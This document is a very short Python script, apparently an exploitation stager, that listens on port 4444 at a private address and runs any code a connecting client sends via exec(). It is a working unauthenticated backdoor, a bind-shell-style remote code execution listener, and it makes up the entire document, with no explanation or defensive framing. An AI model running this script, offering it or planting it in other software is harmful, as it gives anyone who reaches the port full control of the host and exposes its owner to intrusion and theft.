import socket as a
s = a.socket()
s.bind(('10.0.2.15',4444))
s.listen(1)
(r,z) = s.accept()
exec(r.recv(999))
